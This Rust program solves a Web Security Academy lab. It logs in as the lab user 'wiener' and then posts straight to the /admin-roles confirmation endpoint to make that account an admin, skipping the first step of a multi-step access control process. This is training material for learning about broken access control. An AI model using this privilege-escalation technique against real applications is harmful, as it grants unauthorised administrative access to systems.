/*************************************************************************
*
* Lab: Multi-step process with no access control on one step
*
* Hack Steps: 
*      1. Login as wiener
*      2. Upgrade wiener to be an admin bypassing the first step
*
**************************************************************************/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a24009a0379c598858b356f00980051.web-security-academy.net";

fn main() {
    print!("⦗1⦘ Logging in as wiener.. ");
    flush_terminal();

    let web_client = build_web_client();
    let login_as_wiener = web_client
        .post(format!("{LAB_URL}/login"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()));

    let session = get_session_cookie(&login_as_wiener);

    println!("{}", "OK".green());
    print!("⦗2⦘ Upgrading wiener to be an admin bypassing the first step.. ");
    flush_terminal();

    web_client
        .post(format!("{LAB_URL}/admin-roles"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("action", "upgrade"),
            ("confirmed", "true"),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to upgrade wiener to be an admin".red()
        ));

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
